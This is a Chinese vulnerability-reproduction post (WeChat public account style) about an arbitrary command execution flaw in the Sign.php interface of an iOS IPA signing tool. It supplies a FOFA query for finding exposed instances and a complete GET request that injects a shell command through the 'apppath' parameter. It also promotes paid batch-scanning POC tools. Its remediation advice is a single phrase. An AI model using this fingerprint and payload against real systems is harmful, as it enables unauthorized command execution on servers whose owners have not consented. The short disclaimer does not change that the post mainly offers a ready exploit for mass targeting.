#  苹果IOS端IPA签名工具Sign.php接口存在任意命令执行漏洞 附POC   
2024-11-10更新  南风漏洞复现文库   2024-11-10 23:42  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 苹果IOS端IPA签名工具简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
苹果IOS端IPA签名工具  
## 2.漏洞描述  
  
苹果IOS端IPA签名工具Sign.php接口存在任意命令执行漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
苹果IOS端IPA签名工具  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3W5RE4QMOEsDnHUpM4rvgFibe51Gc8XphlJmoWOU4IVzaY5moFrNC4Tw/640?wx_fmt=png&from=appmsg "null")  
  
苹果IOS端IPA签名工具Sign.php接口存在任意命令执行漏洞  
## 4.fofa查询语句  
  
body="/assets/index/css/mobileSelect.css"  
## 5.漏洞复现  
  
漏洞链接：https://xxx.xx.xx.xxx/api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|id>2.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1  
  
漏洞数据包：  
```
GET /api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|id>2.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1 HTTP/1.1
Host: xxx.xx.xx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3W8dzOwZ8FzFicS5eqxWuOGn1jVqNWUp4FRlAf2zeHCKzDgd9C6IgncQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3ib6K38jLzJ8mXEvtta9NTt1ySLl0ialUrUSk55QoWNEUsTdiaaan5ianRA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3z3EOlPpOX0kILPOE0PyYWiap92Ww19ZCFpRuCE9QKOtnqISm8jEkVXA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3JE2FkDx0icibvXepM6mvdFJjvFH6OM4B1pghZj6iauLIsFIyAoK90hquw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3Yq5TCoytLK9ONW3t9yh0BmnZOhEgDHibbul07ibC6ibkYdEPtVicicdDVIQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2eQL8pXicxib2tRU0rMYLj3Oe5xNqQCc7Z4uIrcSKsUgZWFIpBzB8ibQ1lWgibcWxAhFAzAAnFZcZow/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[WordPress Time Clock插件存在远程代码执行漏洞CVE-2024-9593 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487724&idx=1&sn=bc4ff16c25b5f725c98a97a4467bfe2f&chksm=974b9deba03c14fdf3b8211c78d4d6a2b68e420ccbdd16d2a10c9988fc9381d40bc9b683ed0d&scene=21#wechat_redirect)  
  
  
  
  
